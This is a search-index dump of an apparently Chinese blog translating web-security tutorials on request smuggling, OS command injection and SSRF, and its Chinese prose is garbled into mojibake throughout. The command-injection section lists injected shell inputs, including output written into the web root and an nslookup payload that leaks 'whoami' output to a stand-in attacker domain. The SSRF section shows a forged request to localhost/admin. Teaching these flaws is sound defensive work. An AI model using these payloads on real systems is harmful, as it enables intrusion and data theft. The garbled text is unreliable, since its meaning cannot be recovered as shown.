æ³¨æ„ï¼Œå½“è¯•å›¾é€šè¿‡å¹²æ‰°å…¶ä»–è¯·æ±‚æ¥ç¡®è®¤è¯·æ±‚èµ°ç§æ¼æ´æ—¶ï¼Œåº”è®°ä½ä¸€äº›é‡è¦çš„æ³¨æ„äº‹é¡¹ï¼š â€œæ”»å‡»â€è¯·æ±‚å’Œâ€œæ­£å¸¸â€è¯·æ±‚åº”è¯¥ä½¿ç”¨ä¸åŒçš„ç½‘ç»œè¿æ¥å‘é€åˆ°æœåŠ¡å™¨ã€‚é€šè¿‡åŒä¸€ä¸ªè¿æ¥å‘é€ä¸¤ä¸ªè¯·æ±‚ä¸ä¼šè¯æ˜è¯¥æ¼æ´å­˜åœ¨ã€‚ â€œæ”»å‡»â€è¯·æ±‚å’Œâ€œæ­£å¸¸â€è¯·æ±‚åº”å°½å¯èƒ½ä½¿ç”¨ç›¸åŒçš„URLå’Œå‚æ•°åã€‚è¿™æ˜¯å› ä¸ºè®¸å¤šç°ä»£åº”ç”¨ç¨‹åºæ ¹æ®URLå’Œå‚æ•°å°†å‰ç«¯è¯·æ±‚è·¯ç”±åˆ°ä¸åŒçš„åç«¯æœåŠ¡å™¨ã€‚ä½¿ç”¨ç›¸åŒçš„URLå’Œå‚æ•°ä¼šå¢åŠ è¯·æ±‚è¢«åŒä¸€ä¸ªåç«¯æœåŠ¡å™¨å¤„ç†çš„å¯èƒ½æ€§ï¼Œè¿™å¯¹äºæ”»å‡»èµ·ä½œç”¨è‡³å…³é‡è¦ã€‚ å½“æµ‹è¯•â€œæ­£å¸¸â€è¯·æ±‚ä»¥æ£€æµ‹æ¥è‡ªâ€œæ”»å‡»â€è¯·æ±‚çš„ä»»ä½•å¹²æ‰°æ—¶ï¼Œæ‚¨ä¸åº”ç”¨ç¨‹åºåŒæ—¶æ¥æ”¶çš„ä»»ä½•å…¶ä»–è¯·æ±‚ï¼ˆåŒ…æ‹¬æ¥è‡ªå…¶ä»–ç”¨æˆ·çš„è¯·æ±‚ï¼‰å¤„äºç«äº‰çŠ¶æ€ã€‚æ‚¨åº”è¯¥åœ¨â€œæ”»å‡»â€è¯·æ±‚ä¹‹åç«‹å³å‘é€â€œæ­£å¸¸â€è¯·æ±‚ã€‚å¦‚æœåº”ç”¨ç¨‹åºæ­£å¿™ï¼Œåˆ™å¯èƒ½éœ€è¦æ‰§è¡Œå¤šæ¬¡å°è¯•æ¥ç¡®è®¤è¯¥æ¼æ´ã€‚ åœ¨æŸäº›åº”ç”¨ä¸­ï¼Œå‰ç«¯æœåŠ¡å™¨å……å½“è´Ÿè½½å‡è¡¡å™¨ï¼Œæ ¹æ®æŸç§è´Ÿè½½å‡è¡¡ç®—æ³•å°†è¯·æ±‚è½¬å‘åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿã€‚å¦‚æœæ‚¨çš„â€œæ”»å‡»â€å’Œâ€œæ­£å¸¸â€è¯·æ±‚è¢«è½¬å‘åˆ°ä¸åŒçš„åç«¯ç³»ç»Ÿï¼Œåˆ™æ”»å‡»å°†å¤±è´¥ã€‚è¿™æ˜¯æ‚¨å¯èƒ½éœ€è¦å¤šæ¬¡å°è¯•æ‰èƒ½ç¡®è®¤æ¼æ´çš„å¦ä¸€ä¸ªåŸå› ã€‚ å¦‚æœæ‚¨çš„æ”»å‡»æˆåŠŸåœ°å¹²æ‰°äº†åç»­è¯·æ±‚ï¼Œä½†è¿™ä¸æ˜¯æ‚¨ä¸ºæ£€æµ‹å¹²æ‰°è€Œå‘é€çš„â€œæ­£å¸¸â€è¯·æ±‚ï¼Œé‚£ä¹ˆè¿™æ„å‘³ç€å¦ä¸€ä¸ªåº”ç”¨ç¨‹åºç”¨æˆ·å—åˆ°äº†æ‚¨çš„æ”»å‡»çš„å½±å“ã€‚å¦‚æœæ‚¨ç»§ç»­æ‰§è¡Œæµ‹è¯•ï¼Œè¿™å¯èƒ½ä¼šå¯¹å…¶ä»–ç”¨æˆ·äº§ç”Ÿç ´åæ€§å½±å“ï¼Œæ‚¨åº”è¯¥è°¨æ…è¡Œäº‹ã€‚ ","date":"2021-03-04","objectID":"/translation/web-security/request-smuggling/finding-request-smuggling/:2:2","tags":[],"title":"Finding request smuggling","uri":"/translation/web-security/request-smuggling/finding-request-smuggling/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ OS command injection","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"OS command injection åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Šä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥ï¼Œæè¿°å¦‚ä½•æ£€æµ‹å’Œåˆ©ç”¨æ­¤æ¼æ´ï¼Œä¸ºä¸åŒçš„æ“ä½œç³»ç»Ÿé˜æ˜ä¸€äº›æœ‰ç”¨çš„å‘½ä»¤å’ŒæŠ€æœ¯ï¼Œå¹¶æ€»ç»“å¦‚ä½•é˜²æ­¢æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥ã€‚ ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"ä»€ä¹ˆæ˜¯æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥ OS å‘½ä»¤æ³¨å…¥ï¼ˆä¹Ÿç§°ä¸º shell æ³¨å…¥ï¼‰æ˜¯ä¸€ä¸ª web å®‰å…¨æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…åœ¨è¿è¡Œåº”ç”¨ç¨‹åºçš„æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„çš„æ“ä½œç³»ç»Ÿå‘½ä»¤ï¼Œè¿™é€šå¸¸ä¼šå¯¹åº”ç”¨ç¨‹åºåŠå…¶æ‰€æœ‰æ•°æ®é€ æˆä¸¥é‡å±å®³ã€‚å¹¶ä¸”ï¼Œæ”»å‡»è€…ä¹Ÿå¸¸å¸¸åˆ©ç”¨æ­¤æ¼æ´å±å®³åŸºç¡€è®¾æ–½ä¸­çš„å…¶ä»–éƒ¨åˆ†ï¼Œåˆ©ç”¨ä¿¡ä»»å…³ç³»æ”»å‡»ç»„ç»‡å†…çš„å…¶ä»–ç³»ç»Ÿã€‚ ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:1:0","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"æ‰§è¡Œä»»æ„å‘½ä»¤ å‡è®¾æŸä¸ªè´­ç‰©åº”ç”¨ç¨‹åºå…è®¸ç”¨æˆ·æŸ¥çœ‹æŸä¸ªå•†å“åœ¨ç‰¹å®šå•†åº—ä¸­æ˜¯å¦æœ‰åº“å­˜ï¼Œæ­¤ä¿¡æ¯å¯ä»¥é€šè¿‡ä»¥ä¸‹ URL è·å–ï¼š https://insecure-website.com/stockStatus?productID=381\u0026storeID=29 ä¸ºäº†æä¾›è¿”å›ä¿¡æ¯ï¼Œåº”ç”¨ç¨‹åºå¿…é¡»æŸ¥è¯¢å„ç§é—ç•™ç³»ç»Ÿã€‚ç”±äºå†å²åŸå› ï¼Œæ­¤åŠŸèƒ½é€šè¿‡è°ƒç”¨ shell å‘½ä»¤å¹¶ä¼ é€’å‚æ•°æ¥å®ç°å¦‚ä¸‹ï¼š stockreport.pl 381 29 æ­¤å‘½ä»¤è¾“å‡ºç‰¹å®šå•†åº—ä¸­æŸä¸ªå•†å“çš„åº“å­˜ä¿¡æ¯ï¼Œå¹¶å°†å…¶è¿”å›ç»™ç”¨æˆ·ã€‚ ç”±äºåº”ç”¨ç¨‹åºæ²¡æœ‰å¯¹ OS å‘½ä»¤æ³¨å…¥è¿›è¡Œé˜²å¾¡ï¼Œé‚£ä¹ˆæ”»å‡»è€…å¯ä»¥æäº¤ç±»ä¼¼ä»¥ä¸‹è¾“å…¥æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ï¼š \u0026 echo aiwefwlguh \u0026 å¦‚æœè¿™ä¸ªè¾“å…¥è¢«å½“ä½œ productID å‚æ•°ï¼Œé‚£ä¹ˆåº”ç”¨ç¨‹åºæ‰§è¡Œçš„å‘½ä»¤å°±æ˜¯ï¼š stockreport.pl \u0026 echo aiwefwlguh \u0026 29 echo å‘½ä»¤å°±æ˜¯è®©æä¾›çš„å­—ç¬¦ä¸²åœ¨è¾“å‡ºä¸­æ˜¾ç¤ºçš„ä½œç”¨ï¼Œå…¶æ˜¯æµ‹è¯•æŸäº› OS å‘½ä»¤æ³¨å…¥çš„æœ‰æ•ˆæ–¹æ³•ã€‚\u0026 ç¬¦å·å°±æ˜¯ä¸€ä¸ª shell å‘½ä»¤åˆ†éš”ç¬¦ï¼Œå› æ­¤ä¸Šä¾‹å®é™…æ‰§è¡Œçš„æ˜¯ä¸€ä¸ªæ¥ä¸€ä¸ªçš„ä¸‰ä¸ªå•ç‹¬çš„å‘½ä»¤ã€‚å› æ­¤ï¼Œè¿”å›ç»™ç”¨æˆ·çš„è¾“å‡ºä¸ºï¼š Error - productID was not provided aiwefwlguh 29: command not found è¿™ä¸‰è¡Œè¾“å‡ºè¡¨æ˜ï¼š åŸæ¥çš„ stockreport.pl å‘½ä»¤ç”±äºæ²¡æœ‰æ”¶åˆ°é¢„æœŸçš„å‚æ•°ï¼Œå› æ­¤è¿”å›é”™è¯¯ä¿¡æ¯ã€‚ æ³¨å…¥çš„ echo å‘½ä»¤æ‰§è¡ŒæˆåŠŸã€‚ åŸå§‹çš„å‚æ•° 29 è¢«å½“æˆäº†å‘½ä»¤æ‰§è¡Œï¼Œä¹Ÿå¯¼è‡´äº†å¼‚å¸¸ã€‚ å°†å‘½ä»¤åˆ†éš”ç¬¦ \u0026 æ”¾åœ¨æ³¨å…¥å‘½ä»¤ä¹‹åé€šå¸¸æ˜¯æœ‰ç”¨çš„ï¼Œå› ä¸ºå®ƒä¼šå°†æ³¨å…¥çš„å‘½ä»¤ä¸æ³¨å…¥ç‚¹åé¢çš„å‘½ä»¤åˆ†å¼€ï¼Œè¿™å‡å°‘äº†éšåå‘ç”Ÿçš„äº‹æƒ…å°†é˜»æ­¢æ³¨å…¥å‘½ä»¤æ‰§è¡Œçš„å¯èƒ½æ€§ã€‚ ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"å¸¸ç”¨çš„å‘½ä»¤ å½“ä½ è¯†åˆ« OS å‘½ä»¤æ³¨å…¥æ¼æ´æ—¶ï¼Œæ‰§è¡Œä¸€äº›åˆå§‹å‘½ä»¤ä»¥è·å–æœ‰å…³ç³»ç»Ÿä¿¡æ¯é€šå¸¸å¾ˆæœ‰ç”¨ã€‚ä¸‹é¢æ˜¯ä¸€äº›åœ¨ Linux å’Œ Windows å¹³å°ä¸Šå¸¸ç”¨å‘½ä»¤çš„æ‘˜è¦ï¼š å‘½ä»¤å«ä¹‰ Linux Windows æ˜¾ç¤ºå½“å‰ç”¨æˆ·å whoami whoami æ˜¾ç¤ºæ“ä½œç³»ç»Ÿä¿¡æ¯ uname -a ver æ˜¾ç¤ºç½‘ç»œé…ç½® ifconfig ipconfig /all æ˜¾ç¤ºç½‘ç»œè¿æ¥ netstat -an netstat -an æ˜¾ç¤ºæ­£åœ¨è¿è¡Œçš„è¿›ç¨‹ ps -ef tasklist ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"ä¸å¯è§ OS å‘½ä»¤æ³¨å…¥æ¼æ´ è®¸å¤š OS å‘½ä»¤æ³¨å…¥æ¼æ´éƒ½æ˜¯ä¸å¯è§çš„ï¼Œè¿™æ„å‘³ç€åº”ç”¨ç¨‹åºä¸ä¼šåœ¨å…¶ HTTP å“åº”ä¸­è¿”å›å‘½ä»¤çš„è¾“å‡ºã€‚ ä¸å¯è§ OS å‘½ä»¤æ³¨å…¥æ¼æ´ä»ç„¶å¯ä»¥è¢«åˆ©ç”¨ï¼Œä½†éœ€è¦ä¸åŒçš„æŠ€æœ¯ã€‚ å‡è®¾æŸä¸ª web ç«™ç‚¹å…è®¸ç”¨æˆ·æäº¤åé¦ˆä¿¡æ¯ï¼Œç”¨æˆ·è¾“å…¥ä»–ä»¬çš„ç”µå­é‚®ä»¶åœ°å€å’Œåé¦ˆä¿¡æ¯ï¼Œç„¶åæœåŠ¡ç«¯ç”Ÿæˆä¸€å°åŒ…å«åé¦ˆä¿¡æ¯çš„ç”µå­é‚®ä»¶æŠ•é€’ç»™ç½‘ç«™ç®¡ç†å‘˜ã€‚ä¸ºæ­¤ï¼ŒæœåŠ¡ç«¯éœ€è¦è°ƒç”¨ mail ç¨‹åºï¼Œå¦‚ä¸‹ï¼š mail -s \"This site is great\" -aFrom:peter@normal-user.net feedback@vulnerable-website.com mail å‘½ä»¤çš„è¾“å‡ºå¹¶æ²¡æœ‰ä½œä¸ºåº”ç”¨ç¨‹åºçš„å“åº”è¿”å›ï¼Œå› æ­¤ä½¿ç”¨ echo è´Ÿè½½ä¸ä¼šæœ‰æ•ˆã€‚è¿™ç§æƒ…å†µï¼Œä½ å¯ä»¥ä½¿ç”¨ä¸€äº›å…¶ä»–çš„æŠ€æœ¯æ¥æ£€æµ‹æ¼æ´ã€‚ ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:4:0","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"åŸºäºå»¶æ—¶æ£€æµ‹ ä½ å¯ä»¥ä½¿ç”¨èƒ½è§¦å‘å»¶æ—¶çš„æ³¨å…¥å‘½ä»¤ï¼Œç„¶åæ ¹æ®åº”ç”¨ç¨‹åºçš„å“åº”æ—¶é•¿æ¥åˆ¤æ–­æ³¨å…¥çš„å‘½ä»¤æ˜¯å¦è¢«æ‰§è¡Œã€‚ä½¿ç”¨ ping å‘½ä»¤æ˜¯ä¸€ç§æœ‰æ•ˆçš„æ–¹å¼ï¼Œå› ä¸ºæ­¤å‘½ä»¤å…è®¸ä½ æŒ‡å®šè¦å‘é€çš„ ICMP åŒ…çš„æ•°é‡ä»¥åŠå‘½ä»¤è¿è¡Œçš„æ—¶é—´ï¼š \u0026 ping -c 10 127.0.0.1 \u0026 è¿™ä¸ªå‘½ä»¤å°†ä¼š ping 10 ç§’é’Ÿã€‚ ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:4:1","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"é‡å®šå‘è¾“å‡º ä½ å¯ä»¥å°†æ³¨å…¥å‘½ä»¤çš„è¾“å‡ºé‡å®šå‘åˆ°èƒ½å¤Ÿä½¿ç”¨æµè§ˆå™¨è®¿é—®åˆ°çš„ web ç›®å½•ã€‚ä¾‹å¦‚ï¼Œåº”ç”¨ç¨‹åºä½¿ç”¨ /var/www/static è·¯å¾„ä½œä¸ºé™æ€èµ„æºç›®å½•ï¼Œé‚£ä¹ˆä½ å¯ä»¥æäº¤ä»¥ä¸‹è¾“å…¥ï¼š \u0026 whoami \u003e /var/www/static/whoami.txt \u0026 \u003e ç¬¦å·å°±æ˜¯è¾“å‡ºé‡å®šå‘çš„æ„æ€ï¼Œä¸Šé¢è¿™ä¸ªå‘½ä»¤å°±æ˜¯æŠŠ whoami çš„æ‰§è¡Œç»“æœè¾“å‡ºåˆ° /var/www/static/whoami.txt æ–‡ä»¶ä¸­ï¼Œç„¶åä½ å°±å¯ä»¥é€šè¿‡æµè§ˆå™¨è®¿é—® https://vulnerable-website.com/whoami.txt æŸ¥çœ‹å‘½ä»¤çš„è¾“å‡ºç»“æœã€‚ ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:4:2","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"ä½¿ç”¨ OAST æŠ€æœ¯ ä½¿ç”¨ OAST å¸¦å¤–æŠ€æœ¯å°±æ˜¯ä½ è¦æœ‰ä¸€ä¸ªè‡ªå·±æ§åˆ¶çš„å¤–éƒ¨ç³»ç»Ÿï¼Œç„¶åæ³¨å…¥å‘½ä»¤æ‰§è¡Œï¼Œè§¦å‘ä¸ä½ æ§åˆ¶çš„ç³»ç»Ÿçš„äº¤äº’ã€‚ä¾‹å¦‚ï¼š \u0026 nslookup kgji2ohoyw.web-attacker.com \u0026 è¿™ä¸ªè´Ÿè½½ä½¿ç”¨ nslookup å‘½ä»¤å¯¹æŒ‡å®šåŸŸåè¿›è¡Œ DNS æŸ¥æ‰¾ï¼Œæ”»å‡»è€…å¯ä»¥ç›‘è§†æ˜¯å¦å‘ç”Ÿäº†æŒ‡å®šçš„æŸ¥æ‰¾ï¼Œä»è€Œæ£€æµ‹å‘½ä»¤æ˜¯å¦æˆåŠŸæ³¨å…¥æ‰§è¡Œã€‚ å¸¦å¤–é€šé“è¿˜æä¾›äº†ä¸€ç§ç®€å•çš„æ–¹å¼å°†æ³¨å…¥å‘½ä»¤çš„è¾“å‡ºä¼ é€’å‡ºæ¥ï¼Œä¾‹å¦‚ï¼š \u0026 nslookup `whoami`.kgji2ohoyw.web-attacker.com \u0026 è¿™å°†å¯¼è‡´å¯¹æ”»å‡»è€…æ§åˆ¶çš„åŸŸåçš„ DNS æŸ¥æ‰¾ï¼Œå¦‚ï¼š wwwuser.kgji2ohoyw.web-attacker.com ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:4:3","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"æ³¨å…¥ OS å‘½ä»¤çš„æ–¹æ³• å„ç§ shell å…ƒå­—ç¬¦éƒ½å¯ä»¥ç”¨äºæ‰§è¡Œ OS å‘½ä»¤æ³¨å…¥æ”»å‡»ã€‚ è®¸å¤šå­—ç¬¦ç”¨ä½œå‘½ä»¤åˆ†éš”ç¬¦ï¼Œä»è€Œå°†å¤šä¸ªå‘½ä»¤è¿æ¥åœ¨ä¸€èµ·ã€‚ä»¥ä¸‹åˆ†éš”ç¬¦åœ¨ Windows å’Œ Unix ç±»ç³»ç»Ÿä¸Šå‡å¯ä½¿ç”¨ï¼š \u0026 \u0026\u0026 | || ä»¥ä¸‹å‘½ä»¤åˆ†éš”ç¬¦ä»…é€‚ç”¨äº Unix ç±»ç³»ç»Ÿï¼š ; æ¢è¡Œç¬¦ï¼ˆ0x0a æˆ– \\nï¼‰ åœ¨ Unix ç±»ç³»ç»Ÿä¸Šï¼Œè¿˜å¯ä»¥ä½¿ç”¨ ` åå¼•å·å’Œ $ ç¬¦å·åœ¨åŸå§‹å‘½ä»¤å†…æ³¨å…¥å‘½ä»¤å†…è”æ‰§è¡Œï¼š ` $ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¸åŒçš„ shell å…ƒå­—ç¬¦å…·æœ‰ç»†å¾®ä¸åŒçš„è¡Œä¸ºï¼Œè¿™äº›è¡Œä¸ºå¯èƒ½ä¼šå½±å“å®ƒä»¬åœ¨æŸäº›æƒ…å†µä¸‹æ˜¯å¦å·¥ä½œï¼Œä»¥åŠå®ƒä»¬æ˜¯å¦å…è®¸åœ¨å¸¦å†…æ£€ç´¢å‘½ä»¤è¾“å‡ºï¼Œæˆ–è€…åªå¯¹ä¸å¯è§ OS åˆ©ç”¨æœ‰æ•ˆã€‚ æœ‰æ—¶ï¼Œä½ æ§åˆ¶çš„è¾“å…¥ä¼šå‡ºç°åœ¨åŸå§‹å‘½ä»¤ä¸­çš„å¼•å·å†…ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ‚¨éœ€è¦åœ¨ä½¿ç”¨åˆé€‚çš„ shell å…ƒå­—ç¬¦æ³¨å…¥æ–°å‘½ä»¤ä¹‹å‰ç»ˆæ­¢å¼•ç”¨çš„ä¸Šä¸‹æ–‡ï¼ˆä½¿ç”¨ \" æˆ– â€™ï¼‰ã€‚ ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:5:0","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"å¦‚ä½•é˜²å¾¡ OS å‘½ä»¤æ³¨å…¥æ”»å‡» é˜²æ­¢ OS å‘½ä»¤æ³¨å…¥æ”»å‡»æœ€æœ‰æ•ˆçš„æ–¹æ³•å°±æ˜¯æ°¸è¿œä¸è¦ä»åº”ç”¨å±‚ä»£ç ä¸­è°ƒç”¨ OS å‘½ä»¤ã€‚å‡ ä¹åœ¨å¯¹äºæ‰€æœ‰æƒ…å†µä¸‹ï¼Œéƒ½æœ‰ä½¿ç”¨æ›´å®‰å…¨çš„å¹³å° API æ¥å®ç°æ‰€éœ€åŠŸèƒ½çš„æ›¿ä»£æ–¹æ³•ã€‚ å¦‚æœè®¤ä¸ºä½¿ç”¨ç”¨æˆ·æä¾›çš„è¾“å…¥è°ƒç”¨ OS å‘½ä»¤æ˜¯ä¸å¯é¿å…çš„ï¼Œé‚£ä¹ˆå¿…é¡»æ‰§è¡Œä¸¥æ ¼çš„è¾“å…¥éªŒè¯ã€‚æœ‰æ•ˆéªŒè¯çš„ä¸€äº›ä¾‹å­åŒ…æ‹¬ï¼š æ ¹æ®å…è®¸å€¼çš„ç™½åå•æ ¡éªŒã€‚ éªŒè¯è¾“å…¥æ˜¯å¦ä¸ºæ•°å­—ã€‚ éªŒè¯è¾“å…¥æ˜¯å¦åªåŒ…å«å­—æ¯æ•°å­—å­—ç¬¦ï¼Œä¸åŒ…å«å…¶å®ƒè¯­æ³•æˆ–ç©ºæ ¼ã€‚ ä¸è¦è¯•å›¾é€šè¿‡è½¬ä¹‰ shell å…ƒå­—ç¬¦æ¥æ¸…ç†è¾“å…¥ã€‚å®é™…ä¸Šï¼Œè¿™å¤ªå®¹æ˜“å‡ºé”™ï¼Œä¸”å¾ˆå®¹æ˜“è¢«ç†Ÿç»ƒçš„æ”»å‡»è€…ç»•è¿‡ã€‚ ","date":"2021-03-03","objectID":"/translation/web-security/command-injection/os-command-injection/:6:0","tags":[],"title":"web å®‰å…¨ä¹‹ OS command injection","uri":"/translation/web-security/command-injection/os-command-injection/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ Server-side request forgery","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"Server-side request forgery (SSRF) åœ¨æœ¬èŠ‚ä¸­ï¼Œæˆ‘ä»¬å°†è§£é‡Š server-side request forgeryï¼ˆæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä»€ä¹ˆï¼Œå¹¶æè¿°ä¸€äº›å¸¸è§çš„ç¤ºä¾‹ï¼Œä»¥åŠè§£é‡Šå¦‚ä½•å‘ç°å’Œåˆ©ç”¨å„ç§ SSRF æ¼æ´ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:0:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"SSRF æ˜¯ä»€ä¹ˆ SSRF æœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ æ˜¯ä¸€ä¸ª web æ¼æ´ï¼Œå®ƒå…è®¸æ”»å‡»è€…è¯±å¯¼æœåŠ¡ç«¯ç¨‹åºå‘æ”»å‡»è€…é€‰æ‹©çš„ä»»ä½•åœ°å€å‘èµ· HTTP è¯·æ±‚ã€‚ åœ¨å…¸å‹çš„ SSRF ç¤ºä¾‹ä¸­ï¼Œæ”»å‡»è€…å¯èƒ½ä¼šä½¿æœåŠ¡ç«¯å»ºç«‹ä¸€ä¸ªåˆ°æœåŠ¡ç«¯è‡ªèº«ã€æˆ–ç»„ç»‡åŸºç¡€æ¶æ„ä¸­çš„å…¶å®ƒåŸºäº web çš„æœåŠ¡ã€æˆ–å¤–éƒ¨ç¬¬ä¸‰æ–¹ç³»ç»Ÿçš„è¿æ¥ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:1:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"SSRF æ”»å‡»çš„å½±å“ æˆåŠŸçš„ SSRF æ”»å‡»é€šå¸¸ä¼šå¯¼è‡´æœªç»æˆæƒçš„æ“ä½œæˆ–å¯¹ç»„ç»‡å†…éƒ¨æ•°æ®çš„è®¿é—®ï¼Œæ— è®ºæ˜¯åœ¨æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºæœ¬èº«ï¼Œè¿˜æ˜¯åº”ç”¨ç¨‹åºå¯ä»¥é€šä¿¡çš„å…¶å®ƒåç«¯ç³»ç»Ÿã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼ŒSSRF æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„çš„å‘½ä»¤ã€‚ åˆ©ç”¨ SSRF æ¼æ´å¯èƒ½å¯ä»¥æ“ä½œæœåŠ¡ç«¯åº”ç”¨ç¨‹åºä½¿å…¶å‘ä¸ä¹‹è¿æ¥çš„å¤–éƒ¨ç¬¬ä¸‰æ–¹ç³»ç»Ÿå‘èµ·æ¶æ„è¯·æ±‚ï¼Œè¿™å°†å¯¼è‡´æ½œåœ¨çš„æ³•å¾‹è´£ä»»å’Œå£°èª‰å—æŸã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:2:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"å¸¸è§çš„ SSRF æ”»å‡» SSRF æ”»å‡»é€šå¸¸åˆ©ç”¨æœåŠ¡ç«¯åº”ç”¨ç¨‹åºçš„ä¿¡ä»»å…³ç³»å‘èµ·æ”»å‡»å¹¶æ‰§è¡Œæœªç»æˆæƒçš„æ“ä½œã€‚è¿™ç§ä¿¡ä»»å…³ç³»å¯èƒ½åŒ…æ‹¬ï¼šå¯¹æœåŠ¡ç«¯è‡ªèº«çš„ä¿¡ä»»ï¼Œæˆ–åŒç»„ç»‡å†…å…¶å®ƒåç«¯ç³»ç»Ÿçš„ä¿¡ä»»ã€‚ ","date":"2021-03-01","objectID":"/translation/web-security/ssrf/ssrf/:3:0","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side request forgery","uri":"/translation/web-security/ssrf/ssrf/"},{"categories":["web security"],"content":"SSRF æ”»å‡»æœåŠ¡ç«¯è‡ªèº« åœ¨é’ˆå¯¹æœåŠ¡ç«¯æœ¬èº«çš„ SSRF æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…è¯±å¯¼åº”ç”¨ç¨‹åºå‘å…¶è‡ªèº«å‘å‡º HTTP è¯·æ±‚ï¼Œè¿™é€šå¸¸éœ€è¦æä¾›ä¸€ä¸ªä¸»æœºåæ˜¯ 127.0.0.1 æˆ–è€… localhost çš„ URL ã€‚ ä¾‹å¦‚ï¼Œå‡è®¾æŸä¸ªè´­ç‰©åº”ç”¨ç¨‹åºï¼Œå…¶å…è®¸ç”¨æˆ·æŸ¥çœ‹æŸä¸ªå•†å“åœ¨ç‰¹å®šå•†åº—ä¸­æ˜¯å¦æœ‰åº“å­˜ã€‚ä¸ºäº†æä¾›åº“å­˜ä¿¡æ¯ï¼Œåº”ç”¨ç¨‹åºéœ€è¦é€šè¿‡ REST API æŸ¥è¯¢å…¶ä»–åç«¯æœåŠ¡ï¼Œè€Œå…¶ä»–åç«¯æœåŠ¡çš„ URL åœ°å€ç›´æ¥åŒ…å«åœ¨å‰ç«¯ HTTP è¯·æ±‚ä¸­ã€‚å› æ­¤ï¼Œå½“ç”¨æˆ·æŸ¥çœ‹å•†å“çš„åº“å­˜çŠ¶æ€æ—¶ï¼Œæµè§ˆå™¨å¯èƒ½å‘å‡ºå¦‚ä¸‹è¯·æ±‚ï¼š POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1 è¿™å°†å¯¼è‡´æœåŠ¡ç«¯å‘æŒ‡å®šçš„ URL å‘å‡ºè¯·æ±‚ï¼Œæ£€ç´¢åº“å­˜çŠ¶æ€ï¼Œç„¶åå°†ç»“æœè¿”å›ç»™ç”¨æˆ·ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥ä¿®æ”¹è¯·æ±‚ä»¥æŒ‡å®šæœåŠ¡å™¨æœ¬åœ°çš„ URL ï¼Œä¾‹å¦‚ï¼š POST /product/stock HTTP/1.0 Content-Type: application/x-www-form-urlencoded Content-Length: 118 stockApi=http://localhost/admin 